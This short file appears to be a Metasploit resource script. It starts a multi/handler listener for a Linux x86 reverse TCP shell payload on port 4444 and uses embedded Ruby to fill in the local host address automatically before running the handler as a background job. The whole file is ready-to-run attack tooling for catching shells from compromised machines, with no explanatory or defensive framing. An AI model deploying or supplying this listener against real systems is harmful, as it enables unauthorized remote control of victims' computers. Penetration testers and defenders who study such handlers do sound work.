use multi/handler
set payload linux/x86/shell/reverse_tcp
set LPORT 4444
<ruby>
var = Socket.ip_address_list[1].ip_address
run_single("set LHOST " + var)
</ruby>
run -j
